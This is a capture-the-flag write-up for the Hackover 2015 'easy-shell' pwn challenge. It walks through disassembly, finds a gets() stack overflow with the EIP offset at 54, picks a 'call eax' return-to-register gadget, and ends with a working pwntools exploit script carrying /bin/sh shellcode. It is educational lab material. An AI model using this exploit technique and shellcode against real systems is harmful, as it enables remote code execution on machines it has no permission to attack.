{"pageContext":{"html":"<p><a href=\"ctf=hackover-2015\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=buffer-overflow,ROP\"></a>\n<a href=\"tools=pwntools,gdb-peda\"></a>\n<a href=\"techniques=ROP\"></a></p>\n<h1>easy-shell (pwn-75)</h1>\n<p>We have a <a href=\"../easy_shell-2fdf5e4dea11c1e96f0a81971b096e48.tgz\">zip</a> file.\nUnzipping it gives us</p>\n<pre><code class=\"language-bash\">$ file easy_shell\neasy_shell: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=db8c496a9a78e4d2b5088ef340c422f757888559, not stripped\n\n$ ./easy_shell \n\n        .-\"; ! ;\"-.\n      .'!  : | :  !`.\n     /\\  ! : ! : !  /\\\n    /\\ |  ! :|: !  | /\\\n   (  \\ \\ ; :!: ; / /  )\n  ( `. \\ | !:|:! | / .' )\n  (`. \\ \\ \\!:|:!/ / / .')\n   \\ `.`.\\ |!|! |/,'.' /\n    `._`.\\\\\\!!!// .'_.'\n       `.`.\\\\|//.'.'\n        |`._`n'_.'| \n        \"----^----\">>\n\nnom nom, shell> AAAA\n</code></pre>\n<p>Easy shell should be easy. Lets start!\nDump of assembler code for function main:</p>\n<pre><code class=\"language-objdump\">   0x080484d6 &#x3C;+0>: lea    ecx,[esp+0x4]\n   0x080484da &#x3C;+4>: and    esp,0xfffffff0\n   0x080484dd &#x3C;+7>: push   DWORD PTR [ecx-0x4]\n   0x080484e0 &#x3C;+10>:    push   ebp\n   0x080484e1 &#x3C;+11>:    mov    ebp,esp\n   0x080484e3 &#x3C;+13>:    push   ecx\n=> 0x080484e4 &#x3C;+14>:    sub    esp,0x4\n   0x080484e7 &#x3C;+17>:    call   0x804847b &#x3C;do_stuff>\n   0x080484ec &#x3C;+22>:    mov    eax,0x2a\n   0x080484f1 &#x3C;+27>:    add    esp,0x4\n   0x080484f4 &#x3C;+30>:    pop    ecx\n   0x080484f5 &#x3C;+31>:    pop    ebp\n   0x080484f6 &#x3C;+32>:    lea    esp,[ecx-0x4]\n   0x080484f9 &#x3C;+35>:    ret    \n</code></pre>\n<p>It calls another function do_stuff</p>\n<pre><code class=\"language-objdump\">   0x0804847b &#x3C;+0>: push   ebp\n   0x0804847c &#x3C;+1>: mov    ebp,esp\n   0x0804847e &#x3C;+3>: sub    esp,0x38\n   0x08048481 &#x3C;+6>: mov    eax,ds:0x80498ec\n   0x08048486 &#x3C;+11>:    sub    esp,0xc\n   0x08048489 &#x3C;+14>:    push   eax\n   0x0804848a &#x3C;+15>:    call   0x8048330 &#x3C;printf@plt>\n   0x0804848f &#x3C;+20>:    add    esp,0x10\n   0x08048492 &#x3C;+23>:    mov    eax,ds:0x80498f0\n   0x08048497 &#x3C;+28>:    sub    esp,0xc\n   0x0804849a &#x3C;+31>:    push   eax\n   0x0804849b &#x3C;+32>:    call   0x8048340 &#x3C;fflush@plt>\n   0x080484a0 &#x3C;+37>:    add    esp,0x10\n   0x080484a3 &#x3C;+40>:    sub    esp,0xc\n   0x080484a6 &#x3C;+43>:    push   0x804869a\n   0x080484ab &#x3C;+48>:    call   0x8048330 &#x3C;printf@plt>\n   0x080484b0 &#x3C;+53>:    add    esp,0x10\n   0x080484b3 &#x3C;+56>:    mov    eax,ds:0x80498f0\n   0x080484b8 &#x3C;+61>:    sub    esp,0xc\n   0x080484bb &#x3C;+64>:    push   eax\n   0x080484bc &#x3C;+65>:    call   0x8048340 &#x3C;fflush@plt>\n   0x080484c1 &#x3C;+70>:    add    esp,0x10\n   0x080484c4 &#x3C;+73>:    sub    esp,0xc\n   0x080484c7 &#x3C;+76>:    lea    eax,[ebp-0x32]\n   0x080484ca &#x3C;+79>:    push   eax\n   0x080484cb &#x3C;+80>:    call   0x8048350 &#x3C;gets@plt>\n   0x080484d0 &#x3C;+85>:    add    esp,0x10\n   0x080484d3 &#x3C;+88>:    nop\n   0x080484d4 &#x3C;+89>:    leave  \n   0x080484d5 &#x3C;+90>:    ret    \n</code></pre>\n<p>So a gets call. This could mean buffer overflow as there is no stack check. We verify using pattern_create.</p>\n<pre><code class=\"language-bash\">gdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : disabled\nPIE       : disabled\nRELRO     : disabled\ngdb-peda$ pattern_create 100\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'\ngdb-peda$ b *0x080484d5\nBreakpoint 2 at 0x80484d5\ngdb-peda$ c\nContinuing.\n\n        .-\"; ! ;\"-.\n      .'!  : | :  !`.\n     /\\  ! : ! : !  /\\\n    /\\ |  ! :|: !  | /\\\n   (  \\ \\ ; :!: ; / /  )\n  ( `. \\ | !:|:! | / .' )\n  (`. \\ \\ \\!:|:!/ / / .')\n   \\ `.`.\\ |!|! |/,'.' /\n    `._`.\\\\\\!!!// .'_.'\n       `.`.\\\\|//.'.'\n        |`._`n'_.'| \n        \"----^----\">>\n\nnom nom, shell> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\ngdb-peda$ pattern_search \nRegisters contain pattern buffer:\nEIP+0 found at offset: 54\nEBP+0 found at offset: 50\nRegisters point to pattern buffer:\n[EAX] --> offset 0 - size ~100\n[ESP] --> offset 58 - size ~42\n</code></pre>\n<p>NX is not enabled.\nWe get EIP overwrite at 54.\nNow our payload format could be :</p>\n<blockquote>\n<p>nops+shellcode+ret<em>addr</em>to_buffer</p>\n</blockquote>\n<p>Only if we know the address of our shellcode.\nBut we notice that when do<em>stuff rets EAX points to our buffer, as can be seen in pattern</em>search above. Well then we can use other technique called 'return to register'. If we can find an instruction 'call eax' in our binary we'll use it to launch our shellcode.\nROPgadget is such a tool that hels us to find such 'gadgets'.</p>\n<pre><code class=\"language-bash\">$ ROPgadget --binary easy_shell | grep 'call eax'\n0x080483dd : adc al, 0x68 ; lock cwde ; add al, 8 ; call eax\n0x080483e1 : add al, 8 ; call eax\n0x080483e3 : call eax\n0x080483e0 : cwde ; add al, 8 ; call eax\n0x080483dc : in al, dx ; adc al, 0x68 ; lock cwde ; add al, 8 ; call eax\n0x080483da : in eax, -0x7d ; in al, dx ; adc al, 0x68 ; lock cwde ; add al, 8 ; call eax\n0x080483df : lock cwde ; add al, 8 ; call eax\n0x080483de : push 0x80498f0 ; call eax\n0x080483db : sub esp, 0x14 ; push 0x80498f0 ; call eax\n</code></pre>\n<p>The instruction at 0x080483e3 is perfect. This will help to execute the payload without knowing the address of shellcode.\nAlso its less work to do, locating the shellcode on the stack is too tiresome and a pain if ASLR is enabled.</p>\n<p>so now our payload format would be:</p>\n<blockquote>\n<p>nops+shellcode+p32(0x080483e3)</p>\n</blockquote>\n<pre><code class=\"language-python\">from pwn import *\ns=remote('easy-shell.hackover.h4q.it',1337)\nfor _ in range(10):\n    print s.recvline(timeout=5)\naddr=p32(0x080483e3)\npayload=\"\\x90\"*(54-36)+\"\\x83\\xec\\x7f\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\x04\\x05\\x04\\x06\\xcd\\x80\\xb0\\x01\\x31\\xdb\\xcd\\x80\"\ns.send(payload+addr)\ns.interactive()\n</code></pre>\n<p>The flag was located in /home/ctf.\n<a href=\"easy_shell.py\">Full exploit</a> in action.</p>\n<p><img src=\"easy_shell.png\" alt=\"action\"></p>"}}